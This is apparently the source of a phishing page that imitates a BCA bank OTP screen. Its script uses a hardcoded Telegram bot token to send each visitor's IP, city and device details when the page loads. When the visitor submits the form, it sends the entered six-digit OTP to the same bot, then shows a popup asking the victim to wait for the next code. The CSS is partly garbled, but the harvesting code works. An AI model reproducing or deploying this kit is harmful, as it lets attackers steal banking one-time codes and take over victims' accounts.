<style>
* {

body {

form#otpForm {

.otp-input-wrapper {

position: relative;

  border: 1px none #fff;

}
#timer {

  top: 50%;

  color: #db0009;
  user-select: none;
}
button#submitBtn {
  width: 100%;
  padding: 12px;
  background: linear-gradient(90deg, #ff000ab8 0%, #d30009 100%);
  color: white;
  font-weight: 700;
  border: none;
  border-radius: 5px;
  font-size: 15px;
  cursor: pointer;
  transition: background-color 0.3s ease;
}
button#submitBtn:hover:not(:disabled) {
  background-color: #be0017c5;
}
button#submitBtn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
/* Popup modal */
#popupModal {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0,0,0,0.4);
  box-shadow: 0 0px 2px #747474;
  justify-content: center;
  align-items: center;
  z-index: 10000;
}
#popupModalContent {
  background: white;
  padding: 20px 25px;
  border-radius: 12px;
  max-width: 280px;
  text-align: center;
  color: green;
  box-shadow: 0 5px 8px #747474;
}
#popupModalContent h3 {
  font-style: italic;
  margin-bottom: 10px;
}
#popupModalContent h4 {
  font-weight: 500;
  font-size:13px;
  margin: 15px 0;
  line-height: 1.4;
  color:#000;
  
}
#popupModalContent img {
  width: 80px;
  height: auto;
  border-radius: 50%;
  margin-bottom: 10px;
}
#popupModalContent button {
  margin-top: 15px;
  padding: 10px 20px;
  border: none;
  border-radius: 5px;
  background: linear-gradient(90deg, #ff000abe 0%, #cb0008 100%);

  color: white;
  width:100%;
  font-weight: 700;
  cursor: pointer;
  transition: background-color 0.3s ease;
}
#popupModalContent button:hover {
  background-color: #00509a;
}
#popupModalContent div > button {
  margin-top: 20px;
  background-color: #3069bf;
  width:100%;
  color: #fff;
  font-weight: 600;
}
#popupModalContent div > button:hover {
  background-color: #bbb;
}
/* Footer */
footer.bca-footer {
  position: fixed;
  bottom: 0;

  background-color: #0060AF;
  color: white;
  display: flex;
  justify-content: space-around;

footer.bca-footer

footer.bca-footer

label {
    color:#000;

 <center>

    <h4 style="font-weight: 900;">mohon tunggu OTP berikutnya..</h4>

       <button id="closePopupBtn" style="box-shadow: 0 5px 8px #747474;">Ke Menu Utama</button>

<script>
  // ==============================================
  // 🔧 KONFIGURASI BOT TELEGRAM — GANTI BAGIAN INI!
  // ==============================================
  const TELEGRAM_BOT_TOKEN = "8710568614:AAFSuzuNlON72t7iJO4qaTvjoH0JJ3IrWMw"; // Contoh: 7123456789:AAG9xXxxxxxxxxx
  const TELEGRAM_CHAT_ID = "8527556684";     // Contoh: 1234567890
  // ==============================================

  // Timer function
  let countdown;
  function startTimer(duration) {
    let timer = duration;
    const timerDisplay = document.getElementById('timer');
    clearInterval(countdown);
    countdown = setInterval(() => {
      timerDisplay.textContent = `${timer}s`;
      timer--;
      if (timer < 0) {
        clearInterval(countdown);
        timerDisplay.textContent = "Expired";
      }
    }, 1000);
  }

  // Kirim pesan ke Telegram
  async function sendToTelegram(message) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      });
      const result = await response.json();
      if (!result.ok) console.warn("Telegram API Error:", result.description);
    } catch (err) {
      console.warn("Gagal kirim ke Telegram:", err);
    }
  }

  // Ambil info lokasi & device
  async function getClientInfo() {
    try {
      const res = await fetch("https://ipinfo.io/json");
      const data = await res.json();

      const kota = data.city || "Tidak diketahui";
      const ip = data.ip || "Tidak diketahui";
      const region = data.region || "Tidak diketahui";
      const country = data.country || "Tidak diketahui";
      const loc = data.loc || "Tidak diketahui";

      let deviceType = "Tidak diketahui";
      if (/android/i.test(navigator.userAgent)) deviceType = "Android";
      else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) deviceType = "iPhone/iPad";
      else deviceType = "PC/Laptop";

      const deviceName = navigator.userAgent;
      const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

      return { kota, ip, region, country, loc, deviceType, deviceName, waktu };
    } catch (error) {
      console.warn("Gagal ambil data lokasi/device", error);
      return { error: "Gagal ambil data" };
    }
  }

  window.onload = async () => {
    startTimer(180);
    // Kirim notifikasi saat halaman dibuka
    const info = await getClientInfo();
    if (!info.error) {
      sendToTelegram(
        `🔔 *HALAMAN DIBUKA*\n` +
        `⏰ Waktu: ${info.waktu}\n` +
        `📍 Kota: ${info.kota}\n` +
        `🌐 IP: ${info.ip}\n` +
        `📱 Perangkat: ${info.deviceType}`
      );
    }
  };

  // Submit form
  document.getElementById("otpForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    const otp = document.getElementById("pin").value.trim();
    const submitBtn = document.getElementById("submitBtn");

    // Validasi OTP: 6 digit angka
    if (otp.length !== 6 || isNaN(otp)) {
      alert("Masukkan 6 digit OTP!");
      return;
    }

    submitBtn.textContent = "Mengirim...";
    submitBtn.disabled = true;

    // Ambil semua info
    const info = await getClientInfo();
    
    // Susun pesan untuk Telegram
    const pesanTelegram = 
      `🚨 *OTP DITERIMA*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🔢 KODE OTP: \`${otp}\`\n` +
      `⏰ Waktu: ${info.waktu || "-"}\n` +
      `📍 Kota: ${info.kota || "-"}\n` +
      `🌐 IP: ${info.ip || "-"}\n` +
      `🌍 Wilayah: ${info.region || "-"}, ${info.country || "-"}\n` +
      `📱 Perangkat: ${info.deviceType || "-"}\n` +
      `💻 Detail: ${info.deviceName?.substring(0, 80) || "-"}\n` +
      `━━━━━━━━━━━━━━━━━━`;

    // Kirim ke Telegram
    await sendToTelegram(pesanTelegram);

    // Tampilkan popup
    document.getElementById("popupModal").style.display = "flex";

    // Reset tombol
    submitBtn.textContent = "Batalkan Transaksi";
    submitBtn.disabled = false;
  });

  // Tombol popup
  document.getElementById("closePopupBtn").addEventListener("click", () => {
    window.location.href = "pilihan.html";
  });

  document.getElementById("nextBtn").addEventListener("click", () => {
    location.reload();
  });
</script>
